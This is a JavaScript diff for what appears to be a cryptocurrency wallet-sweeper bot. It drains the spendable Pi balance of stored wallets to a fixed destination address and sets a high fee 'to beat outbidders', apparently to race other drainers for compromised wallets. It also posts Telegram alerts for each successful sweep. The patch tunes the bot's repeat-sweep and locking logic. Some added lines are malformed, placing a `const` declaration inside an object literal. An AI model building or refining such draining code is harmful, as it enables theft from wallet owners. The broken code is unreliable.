@@ -94,6 +94,11 @@ const SweeperEngine = {
     }
   },
 
+  // Keep track of the last swept balance per wallet to prevent duplicate triggers on the same ledger state
+const lastSweptBalanceMap = new Map();
+
+// ... inside your SweeperEngine object:
+
   async executeInstantSweep(db, bot, wallet) {
     const id = String(wallet.id);
     if (walletLocks.has(id)) return { status: 'LOCKED' };
@@ -113,8 +118,15 @@ const SweeperEngine = {
       const evalResult = await this.evaluateBalance(pubKey);
 
       if (!evalResult.verified || evalResult.spendable <= MIN_THRESHOLD) {
-        walletLocks.delete(id); // release lock if no funds
+        walletLocks.delete(id);
         return { status: 'NO_SWEEPABLE_FUNDS' };
+      }
+
+      // Check if this exact balance was already processed and hasn't changed on-chain yet
+      const lastSwept = lastSweptBalanceMap.get(id);
+      if (lastSwept && Math.abs(evalResult.spendable - lastSwept.balance) < 0.0000001) {
+        walletLocks.delete(id);
+        return { status: 'WAITING_FOR_LEDGER_UPDATE' };
       }
 
       let targetAmount = 0;
@@ -151,7 +163,7 @@ const SweeperEngine = {
       try {
         const freshAccount = await server.loadAccount(pubKey);
         const transaction = new StellarSdk.TransactionBuilder(freshAccount, {
-          fee: String(baseFee * 15),
+          fee: String(baseFee * 15), // High fee priority to beat outbidders
           networkPassphrase: NETWORK_PASSPHRASE
         })
         .addOperation(StellarSdk.Operation.payment({
@@ -172,11 +184,13 @@ const SweeperEngine = {
 
       const now = new Date().toISOString();
       if (success) {
+        // Record this balance state so it doesn't re-trigger on the same pending block
+        lastSweptBalanceMap.set(id, { balance: evalResult.spendable, time: Date.now() });
+
         db.logTransaction({ wallet_id: id, source_address: pubKey, destination_address: DESTINATION, amount: String(sweptAmount), transaction_hash: txHash, status: 'SUCCESS', created_at: now });
         await notifyTelegram(bot, chatTarget, `🚀 <b>SWEEP SUCCESSFUL!</b>\n📦 Box: #${wallet.id}\n💸 Swept Amount: <code>${sweptAmount.toFixed(7)} Pi</code>\n📉 Remaining Balance: <code>${Math.max(0, remainingBalance).toFixed(7)} Pi</code>\n🔗 Hash: <code>${txHash}</code>`);
         
-        // Keep the lock active for 10 seconds to allow the blockchain ledger to update its balance
-        setTimeout(() => walletLocks.delete(id), 10000);
+        walletLocks.delete(id);
         return { status: 'SUCCESS' };
       } else {
         db.logTransaction({ wallet_id: id, source_address: pubKey, destination_address: DESTINATION, amount: '0', status: 'FAILED', error_details: errorReason, created_at: now });
